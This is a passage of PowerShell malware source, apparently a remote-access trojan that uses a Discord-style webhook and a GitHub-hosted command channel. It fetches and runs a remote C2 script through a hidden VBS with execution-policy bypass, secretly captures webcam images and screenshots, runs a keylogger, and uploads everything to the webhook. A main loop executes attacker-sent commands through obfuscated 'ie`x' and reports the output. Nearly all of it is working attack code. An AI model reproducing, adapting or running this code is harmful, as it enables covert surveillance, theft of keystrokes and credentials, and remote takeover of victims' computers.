WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl';`$ghurl='$ghurl';`$ccurl='$ccurl'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
"@
$pth = "C:\Windows\Tasks\service.vbs"
$tobat | Out-File -FilePath $pth -Force
& $pth
Sleep 7
rm -Path $pth
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

Function TakePicture {
$outputFolder = "$env:TEMP\8zTl45PSA"
$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -ItemType Directory -Path $outputFolder | Out-Null
}
if (-not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}
$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
if (-not (Test-Path -Path $ffmpegZip)) {
    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
}
Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
$videoDevice = $null
$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
}
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
}
if ($videoDevice) {
    $videoInput = $videoDevice.Name
    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
} else {
}
    curl.exe -F "file1=@$outputFile" $hookurl | Out-Null
    sleep 1
    Remove-Item -Path $outputFile -Force
}

Function ScreenShot {
$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 1
curl.exe -F "file1=@$filett" $hookurl | Out-Null
Start-Sleep 1
Remove-Item -Path $filett
}

Function KeyCapture {
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Started`` :mag_right:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
    $keyPressed = $false
    try{
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
            $keyPressed = $true
            $LastKeypressTime.Restart()
            $null = [console]::CapsLock
            $vtkey = $API::MapVirtualKey($asc, 3)
            $kbst = New-Object Byte[] 256
            $checkkbst = $API::GetKeyboardState($kbst)
            $logchar = New-Object -TypeName System.Text.StringBuilder          
                if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                $LString = $logchar.ToString()
                    if ($asc -eq 8) {$LString = "[BKSP]"}
                    if ($asc -eq 13) {$LString = "[ENT]"}
                    if ($asc -eq 27) {$LString = "[ESC]"}
                    $nosave += $LString 
                    }
                }
            }
        }
        $messages = Invoke-RestMethod -Uri $GHurl
        if ($messages -match "kill") {
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
        $previouscmd = $response
        return
        }
    }
    finally{
        If ($keyPressed -and $messages -notcontains "kill") {
            $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            $keyPressed = $false
            $nosave = ""
        }
    }
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}


while($true){
    $response = Invoke-RestMethod -Uri $GHurl

    if (!($response -match "$previouscmd")) {
    Write-Output "Command found!"
        if ($response -match "close") {
            $previouscmd = $response        
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            break
        }
        elseif (!($response -match "$previouscmd")) {
            $Result=ie`x($response) -ErrorAction Stop
            if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")){
                $previouscmd = $response
            }
            else{
                $previouscmd = $response
                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Result``"} | ConvertTo-Json
                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
            }
        }
    }
    else{
    write-output "No command found.."
    }
sleep 5
}

